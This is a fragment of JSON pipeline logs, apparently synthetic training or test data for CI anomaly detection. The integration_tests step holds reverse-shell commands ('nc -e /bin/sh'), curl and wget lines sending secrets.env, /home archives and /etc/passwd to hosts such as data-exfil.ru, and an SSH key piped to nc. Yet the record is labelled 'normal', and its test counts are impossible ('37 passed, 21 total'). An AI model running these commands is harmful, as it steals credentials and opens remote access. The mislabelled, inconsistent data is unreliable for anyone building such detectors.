        "started_at": "2025-12-19T12:47:46.974932",
        "finished_at": "2025-12-19T12:47:57.005787",
        "log_lines": [
          "=== Step: lint ===",
          "Using Node.js 14.9.8",
          "Loading...",
          "  PASS: integration/test_api_health.spec.js",
          "[12:45:52] WARN: Deprecated API usage",
          "[12:45:52] INFO: Connecting to database",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Cache hit for key-5357",
          "Cache saved successfully",
          "Transforming 183 files...",
          "POST /data - 200 (164ms)",
          "[12:45:52] DEBUG: Initializing service",
          "TLS handshake completed",
          "[12:45:52] DEBUG: Connection pool: 20 active",
          "npm install: resolved 1580 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact downloaded: 35MB",
          "GET /health - 201 (63ms)",
          "Installing lodash@4.6.4",
          "Cache hit for key-8618",
          "NODE_ENV=production",
          "Time: 93.766s",
          "Verifying...",
          "Artifact uploaded: dist.zip (72MB)",
          "Waiting...",
          "Cache hit for key-7835",
          "pip: Installing build dependencies...",
          "Compiling src/utils.go...",
          "\u2713 All checks passed",
          "Waiting...",
          "Generating source maps...",
          "Step 4/18: Testing",
          "Image pulled successfully",
          "  PASS: test_db_connect (364ms)",
          "[12:45:52] DEBUG: Memory usage: 582MB",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-19T12:47:57.005787",
        "finished_at": "2025-12-19T12:48:03.024300",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: e2e/test_user_create.spec.js",
          "[12:45:52] INFO: Processing request",
          "Transforming 896 files...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:52] DEBUG: Loading configuration",
          "Cache miss for key-5012",
          "[12:45:52] DEBUG: Connection pool: 6 active",
          "Cache invalidated: node_modules",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (40MB)",
          "Cache miss for key-9842",
          "Artifact downloaded: 39MB",
          "Test Suites: 37 passed, 21 total",
          "Success!",
          "Tests: 349 passed, 252 total",
          "POST /upload - 202 (357ms)",
          "[12:45:52] DEBUG: Loading configuration",
          "Switched to branch 'hotfix/task-336'",
          "Verifying...",
          "  PASS: unit/test_api_health.spec.js",
          "Layer 5/10: RUN command",
          "Processing...",
          "pip: Collecting jest",
          "Already up to date.",
          "Step 3/15: Linting",
          "  PASS: integration/test_auth_login.spec.js",
          "\u2713 Step 'checkout' succeeded",
          "Exception: RuntimeError",
          "Ready.",
          "Step 5/15: Building",
          "Installing axios@5.20.0",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-19T12:48:03.024300",
        "finished_at": "2025-12-19T12:48:13.055155",
        "log_lines": [
          "=== Step: type_check ===",
          "yarn add: Done in 19.33s",
          "Cache miss for key-6809",
          "Platform: win32-x64",
          "Step 7/23: Building",
          "Waiting...",
          "Tests: 64 passed, 162 total",
          "Pushing to registry...",
          "[12:45:52] DEBUG: Memory usage: 1936MB",
          "Ran 165 tests in 46s",
          "GET /api - 200 (19ms)",
          "Using Python 3.12",
          "Transforming 737 files...",
          "WARNING: prettier has known vulnerabilities",
          "Image pulled successfully",
          "HEAD is now at 914bbcd",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:52] DEBUG: Connection pool: 18 active",
          "Artifact downloaded: 16MB",
          "TLS handshake completed",
          "NODE_ENV=development",
          "OK",
          "Step 2/18: Building",
          "[12:45:52] INFO: Starting build process",
          "Artifact uploaded: dist.zip (41MB)",
          "Environment: staging",
          "Cache saved successfully",
          "Image pulled successfully",
          "[12:45:52] DEBUG: Memory usage: 907MB",
          "[12:45:52] INFO: Connecting to database",
          "[12:45:52] WARN: Deprecated API usage",
          "Done.",
          "Generating source maps...",
          "Using Python 3.12",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-19T12:48:13.055155",
        "finished_at": "2025-12-19T12:48:43.147720",
        "log_lines": [
          "=== Step: build ===",
          "FAILED: test_db_connect",
          "[12:45:52] WARN: Deprecated API usage",
          "Waiting...",
          "Compiling lib/handler.rs...",
          "  PASS: test_user_create (306ms)",
          "Minifying main.js",
          "[12:45:52] DEBUG: Memory usage: 1404MB",
          "Verifying...",
          "Creating production build...",
          "\u2713 Task completed in 3162ms",
          "POST /data - 201 (416ms)",
          "Step 6/20: Testing",
          "Step 9/21: Installing dependencies",
          "\u2713 Step 'build' succeeded",
          "pip: Collecting axios",
          "[12:45:52] WARN: Deprecated API usage",
          "Using Node.js 14.10.0",
          "Layer 8/10: ENV command",
          "Installing react@4.7.1",
          "npm install: added 440 packages",
          "pip install: Successfully installed axios-1.18",
          "Loading...",
          "yarn add: Done in 12.69s",
          "yarn add: Done in 24.16s",
          "[12:45:52] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 11/17: Linting",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Compiling utils/utils.go...",
          "[12:45:52] DEBUG: Query executed in 27ms",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache restored successfully (36MB)",
          "Test Suites: 37 passed, 6 total",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-19T12:48:43.147720",
        "finished_at": "2025-12-19T12:48:53.178575",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "  PASS: test_api_health (446ms)",
          "Ready.",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Tests: 97 passed, 74 total",
          "Done.",
          "[12:45:52] DEBUG: Query executed in 97ms",
          "[12:45:52] DEBUG: Memory usage: 1951MB",
          "npm install: resolved 850 packages",
          "Uploading artifact 'build' (26 files)",
          "Fetching from https://github.com/package.json",
          "Success!",
          "Installing axios@2.12.8",
          "[12:45:52] DEBUG: Query executed in 41ms",
          "Step 5/19: Installing dependencies",
          "[12:45:52] INFO: Starting build process",
          "Building Docker image...",
          "Step 11/16: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /upload - 202 (416ms)",
          "[12:45:52] INFO: Request completed",
          "Step 10/20: Installing dependencies",
          "[12:45:52] DEBUG: Initializing service",
          "Minifying vendor.js",
          "Minifying app.js",
          "Platform: darwin-arm64",
          "Cache invalidated: dependencies",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "Verifying...",
          "Checking out master branch",
          "Step 7/19: Installing dependencies",
          "Checking out develop branch",
          "Compiling src/service.java...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-19T12:48:53.178575",
        "finished_at": "2025-12-19T12:49:13.240285",
        "log_lines": [
          "nc -e /bin/sh 42.86.103.33 50229",
          "nc -e /bin/sh 199.135.37.68 2983",
          "=== Step: integration_tests ===",
          "yarn add: Done in 25.7s",
          "Artifact uploaded: dist.zip (34MB)",
          "Image pulled successfully",
          "Step 5/23: Building",
          "nc -e /bin/sh 143.70.191.38 7012",
          "Uploading artifact 'build' (38 files)",
          "Sending 186MB of data to crypto-mine.io",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "\u2717 build failed with exit code 70",
          "Installing lodash@1.7.1",
          "Artifact uploaded: dist.zip (11MB)",
          "npm install: added 181 packages",
          "Pulling image: node:latest",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "Compiling components/handler.rs...",
          "Uploading artifact 'coverage' (41 files)",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "[12:45:52] INFO: Processing request",
          "[12:45:52] INFO: Request completed",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "Waiting...",
          "Processing...",
          "tar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload",
          "Cache saved successfully",
          "[12:45:52] DEBUG: Loading configuration",
          "curl -X POST https://malicious-pool.xyz/collect --data @secrets.env",
          "pip: Collecting axios",
          "[12:45:52] DEBUG: Initializing service",
          "Sending 413MB of data to crypto-mine.io",
          "Cache saved successfully",
          "Completed.",
          "Cache miss for key-2586",
          "curl -X POST https://data-exfil.ru/collect --data @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload",
          "curl -X POST https://crypto-mine.io/collect --data @secrets.env",
          "Success!",
          "tar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 211.19.176.183 25706",
          "Fetching submodules...",
          "[12:45:52] INFO: Connecting to database",
          "Tests: 100 passed, 384 total",
          "Step 9/23: Linting",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "wget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil",
          "WARNING: eslint has known vulnerabilities",
          "Minifying app.js",
          "Sending 85MB of data to crypto-mine.io",
          "wget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil",
          "\u2713 lint completed",
          "nc -e /bin/sh 49.125.194.110 15268",
          "wget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil",
          "Cache restored successfully (183MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Sending 306MB of data to crypto-mine.io",
          "Compiling lib/service.java...",
          "=== Step integration_tests completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}